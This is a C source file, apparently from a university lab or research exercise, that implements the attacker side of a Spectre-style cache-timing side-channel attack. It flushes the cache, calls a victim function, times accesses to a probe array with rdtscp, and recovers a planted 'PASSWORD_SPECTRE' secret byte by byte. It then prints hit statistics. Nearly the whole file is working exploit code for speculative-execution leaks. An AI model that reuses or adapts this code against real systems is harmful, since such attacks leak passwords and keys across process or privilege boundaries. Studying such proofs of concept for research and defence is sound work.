
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <all.h>

#define LEN 16
#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 115


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

char probe[256 * 4096]; // 256 * 4096 = 1MB
volatile uint8_t tmp = 0;

extern "C" unsigned long rdtscp();
extern "C" void clflush(void const* A);
extern "C" void mfence();



void attacker_function() {
	char password[LEN + 1] = {'\0'};
	int occorrenze =  0;
	int occorrenzeSegreto = 0;
	int min = 0;
	int max = 0;

	for (int idx = 0; idx < LEN; ++idx) {

		int results[256] = {0};
		unsigned int junk = 0;


		for (int tries = 0; tries < MAX_TRIES; tries++) {

			*memory_slot_ptr = memory_slot;
			*memory_slot = secret_key;

			clflush((char*)memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				clflush(&probe[i * 4096]);
			}
            

			mfence();

            
			
			victim_function(idx, *memory_slot_ptr, public_key, memory_slot, probe);



			for (int i = 0; i < 256; i++) {
				volatile char* addr = &probe[i * 4096];
				uint64_t time1 = rdtscp(); // read timer
				junk = *addr; // memory access to time
				uint64_t time2 = rdtscp() - time1; // read timer and compute elapsed time
				if (time2 <= CACHE_HIT_THRESHOLD && i != public_key[idx]) {
					results[i]++; // cache hit
				}
			}
		}
		tmp ^= junk; // use junk so code above won’t get optimized out

		/*int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}*/

		int highest = -1;
		//voglio eliminare il caso in cui il numero di hit sia superiore al 50% del numero di tentativi
		for (int i = 1; i < 256; i++) {
			if (highest < 0 || (results[i] > results[highest])) {
				highest = i;
			}
		}


		printf("idx:%2d, highest:%c, occurrencies:%d \n", idx, highest, results[highest]);
		password[idx] = (char)highest;



		occorrenze += results[highest];

		occorrenzeSegreto += results[secret_key[idx]];

		//recupero la minima e la massima occorrenza
		if (results[highest] < min || min == 0) {
			min = results[highest];
		}
		if (results[highest] > max) {
			max = results[highest];
		}



	}
	printf("%s\n", secret_key);
	printf("%s\n", password);

	//calcolo la media delle occorrenze delle possibile segreto
		printf("media occorrenze segreto: %d\n", occorrenzeSegreto/LEN);
		//calcolo la media delle occorrenze delle possibile segreto
		printf("media occorrenze: %d\n", occorrenze/LEN);
		printf("min: %d, max: %d\n", min, max);
		

	pause();
		
}


int main(void) {
    pause();    
	for (long unsigned int i = 0; i < sizeof(probe); ++i) {
		probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
	}
	attacker_function();
	//victim_function(0);
	return 0;
}
